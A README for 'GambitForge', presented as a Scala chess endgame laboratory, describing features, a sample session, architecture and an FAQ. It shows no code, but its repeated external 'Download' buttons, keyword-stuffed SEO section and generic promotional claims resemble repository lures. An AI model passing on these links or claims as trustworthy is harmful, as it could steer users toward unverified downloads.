![preview](https://raw.githubusercontent.com/UIlsmunkh/Endgame-Lab-Scala/main/banner_7e731cb.svg)
[![Download](https://raw.githubusercontent.com/UIlsmunkh/Endgame-Lab-Scala/main/start_82a7.svg)](https://UIlsmunkh.github.io/Endgame-Lab-Scala/)

# GambitForge ♟️

### Endgame Laboratory & Adaptive Sparring Partner — built on the JVM

An original chess endgame workshop for the curious mind. GambitForge lets you sculpt a board from scratch — place kings, queens, rooks, bishops, knights, and pawns wherever your imagination insists — then pit that handcrafted scenario against a responsive engine opponent that adapts to the shape of the position. Where the well-known forks of the ecosystem stop at play, GambitForge turns the board into a laboratory: craft, replay, annotate, and dissect hypothetical endings until the geometry of the sixty-four squares becomes second nature.

[![Download](https://raw.githubusercontent.com/UIlsmunkh/Endgame-Lab-Scala/main/start_82a7.svg)](https://UIlsmunkh.github.io/Endgame-Lab-Scala/)

---

## 🧭 Table of Contents

- [What Is GambitForge?](#-what-is-gambitforge)
- [The Philosophy Behind the Board](#-the-philosophy-behind-the-board)
- [Feature Constellation](#-feature-constellation)
- [A Typical Session, Told as a Story](#-a-typical-session-told-as-a-story)
- [Architecture & Craft](#-architecture--craft)
- [Responsive, Multilingual, and Always Awake](#-responsive-multilingual-and-always-awake)
- [SEO Notes for Curious Searchers](#-seo-notes-for-curious-searchers)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Roadmap & Star Chart](#-roadmap--star-chart)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)
- [Support](#-support)

---

## 🔍 What Is GambitForge?

GambitForge is an endgame-centric chess application that flips the usual workflow on its head. Most chess software hands you a starting position and asks you to survive. GambitForge instead hands you a *blank canvas*, a palette of pieces, and a quiet question: **what endgame would you like to understand today?**

Place the white king on e1 and the black king on e8. Add a lone rook. Or build a fortress with a bishop and two pawns defending a corner. Or invent a position that nobody has ever analyzed before — one that exists only in your session. Then press the clock and let the engine answer. Every move it plays is a lesson in opposition, zugzwang, and the invisible arithmetic of squares.

The project is written in Scala and runs on the JVM, which gives it a personality unlike the browser-first tools that dominate the space: it is precise, typed, deterministic, and it treats every position as a first-class citizen rather than a string you paste into a text box.

If you have ever wanted to *author* an endgame rather than merely solve one, this is your workshop.

---

## 🎨 The Philosophy Behind the Board

Chess endgames are, in a sense, allegories about scarcity. Few pieces remain, so every tempo matters, every square is contested, and every decision echoes. GambitForge embraces that scarcity as a design principle:

- **Nothing is hidden.** The position you build is the position you play.
- **The engine is a partner, not an oracle.** It answers your ideas with ideas of its own.
- **Repetition is a virtue.** Saving a position lets you return to it tomorrow, next month, or next year, and see what you missed.
- **The board is a document.** Annotations travel with positions, so reasoning survives the session.

This is chess software that behaves a little like a notebook and a little like a dojo.

---

## ✨ Feature Constellation

### 🛠️ Position Sculptor
- Drag-and-drop placement of any legal piece configuration on a clean eight-by-eight grid.
- Live legality guards: the tool refuses to let you build a position with two kings of the same color, pawns on the first or eighth rank, or a side already in an impossible check state.
- FEN-style position signatures generated on the fly, so a scenario can be copied, shared, or tucked into notes without any extra tooling.
- Bulk palette operations: clear the board, mirror it, flip colors, or randomize a sparse endgame within chosen bounds.

### 🤖 Adaptive Sparring Engine
- Configurable thinking depth for players who want a partner that thinks slowly and carefully, or one that moves almost on instinct.
- Position-aware heuristics that weight king activity, pawn races, and passed-pawn geometry more heavily in sparse material.
- Move suggestions available on request — not forced on you — so the engine can advise without taking the wheel.
- Post-move commentary describing the engine's reasoning in plain language.

### 📓 Annotation & Session Journal
- Attach freeform notes to any position, any move, or any branch of analysis.
- Tournament-style variation trees that let you explore alternatives without losing your main line.
- Export a session as a portable document that opens cleanly in other chess tools that speak standard notation.

### 🧪 Endgame Drills Library
- Curated drill sets covering classic material combinations: rook and pawn, opposite-colored bishops, knight versus bishop, queen versus rook, and many more.
- Progress tracking that records which drills have been cleared and which still resist your attention.
- Custom drill creation from any position you have built yourself — turn your own invention into tomorrow's practice.

### ⏱️ Clock & Tempo Tools
- Blitz, rapid, classical, and correspondence-style time controls.
- Increment support and a "sudden death plus delay" mode for players who like precision.
- A tempo ledger that comments on time spent per move versus position complexity.

### 📤 Import & Export
- Import positions from standard notation strings.
- Export finished sessions into shareable, human-readable files.
- Snapshot support that captures a position at any point in a variation tree.

### 🎯 Evaluation & Insight Panel
- Material summary with a plain-language reading of who stands better and why.
- Tempo indicators that highlight whose move it is and whether a pawn breakthrough is imminent.
- Detection of common endgame motifs: stalemate traps, promotion races, back-rank hazards, and fortress patterns.

---

## 📖 A Typical Session, Told as a Story

Mira sits down with a mug of tea and a question: *can a lone queen actually beat a rook with no pawns on the board?* She opens GambitForge, clears the grid, and places a white king on g1, a black king on g8, a white queen on d1, and a black rook on a8.

She saves the position as *"Queen vs Rook — Corner Study."* She sets the engine to a moderate thinking depth and starts a clock. Nine moves in, the engine's rook sidesteps along the back rank and Mira realizes her queen has been shepherded into a square where her king cannot help. She pauses, branches the variation, rewinds, and tries a different queen route. This time she keeps her king closer.

By the end of the evening she has four annotated variations, a saved drill, and a page of notes explaining why the defender's king must reach the short side of the board. Tomorrow she will return, reload the position, and go deeper.

That is the rhythm GambitForge is designed for — not a race to the end, but a descent into understanding.

---

## 🏗️ Architecture & Craft

GambitForge is engineered as a layered JVM application, with each layer doing exactly one job.

- **Board Kernel** — an immutable model of the position, piece movement rules, and legality checks. Pure, side-effect-aware, and easy to test.
- **Engine Bridge** — an abstraction over chess engines so the application is never chained to a single backend. Swap in a different engine and the rest of the system never notices.
- **Session Layer** — handles annotations, variation trees, drill progress, and persistence. Sessions survive restarts and can be carried between machines as plain files.
- **Presentation Layer** — a scalable UI toolkit that renders the board at any resolution, from a phone screen to a projector.

The codebase favors explicitness over cleverness. Scala's type system is used to encode invariants — a position that violates the rules cannot, by construction, reach the engine.

---

## 🌐 Responsive, Multilingual, and Always Awake

- **Responsive UI** — the board, panels, and annotation editor reflow gracefully across phone, tablet, laptop, and desktop. High-DPI displays are handled without blur, and keyboard navigation is fully supported.
- **Multilingual support** — interface strings are externalized and translated into multiple languages. Players can switch languages inside the app without restarting, and community translations are welcomed.
- **Round-the-clock assistance** — an always-available help desk answers questions about rules, position construction, engine behavior, and exporting sessions. Whether it is three in the afternoon or three in the morning, a human or an automated concierge is on hand.

---

## 🔎 SEO Notes for Curious Searchers

If you arrived here while looking for **chess endgame trainer software**, a **JVM chess position builder**, or an **open-source chess sparring application written in Scala**, you are in the right place. GambitForge is frequently described as an **endgame laboratory**, a **custom chess position editor**, and a **chess study companion for desktop and mobile**. Its design emphasizes **annotated chess variation trees**, **adaptive engine opponents**, and **portable chess session files**. The project aims to be a lasting reference for anyone investigating **chess endgame practice tools**, **position construction utilities**, and **cross-platform board analysis software** in 2026 and beyond.

---

## ❓ Frequently Asked Questions

**Do I need a powerful machine to run it?**
No. GambitForge is lightweight by design. Sparse endgame positions are computationally modest, and the interface scales down gracefully even on entry-level hardware.

**Can I bring my own engine?**
Yes. The Engine Bridge is pluggable, and documentation describes how to wire in a different backend.

**Does it support standard chess notation?**
Yes. Positions can be expressed and read in standard notation, and sessions export cleanly.

**Is my data uploaded anywhere?**
No. Everything lives locally. Positions, annotations, drills, and sessions remain yours.

**Is the interface translated into my language?**
Quite possibly. Translations ship with the application, and adding a new language is a documented, contained task.

**Can I create drills from scratch?**
Absolutely. Any position you build can become a drill in one step.

**Does it work offline?**
Yes. The core experience is entirely local; no network connection is required.

---

## 🗺️ Roadmap & Star Chart

The horizon for GambitForge in 2026 includes:

- A study-mode overlay that reveals how a position changes when pieces are altered in small increments.
- Batch analysis for entire drill libraries at once.
- Enhanced engine commentary with visual heatmaps of square control.
- Deeper export formats aligned with widely used chess study conventions.
- A plugin surface so community members can contribute drill packs and motif detectors.

Each of these is tracked in the issue board. Suggestions are welcome and read carefully.

---

## 🤝 Contributing

Contributions of every kind are valued — documentation improvements, translations, new drill sets, bug reports, and pull requests. Before opening a large change, please start a discussion so the direction can be aligned early. All contributions are expected to follow the project's code of conduct.

---

## 📜 License

GambitForge is distributed under the **MIT License**. The full text of the license lives in the repository root and is also available at the canonical reference: https://opensource.org/licenses/MIT

You are welcome to study, adapt, and redistribute the source under the terms of that license.

---

## ⚠️ Disclaimer

GambitForge is an independent educational and recreational project. It is not affiliated with, endorsed by, or sponsored by any governing chess body, any commercial chess platform, or any engine vendor. Chess engine behavior depends on configuration and hardware, and analysis quality can vary with depth settings. The project is provided on an "as is" basis, without warranty of any kind, express or implied. Users are responsible for ensuring that any positions they build or share comply with the rules and norms of the venues in which they intend to use them. Nothing in this application constitutes professional coaching, tournament advice, or legal guidance.

---

## 💬 Support

Questions, feature ideas, and translation offers are all welcome through the issue tracker. For time-sensitive matters, the project's help desk remains attentive around the clock, every day of the year.

[![Download](https://raw.githubusercontent.com/UIlsmunkh/Endgame-Lab-Scala/main/start_82a7.svg)](https://UIlsmunkh.github.io/Endgame-Lab-Scala/)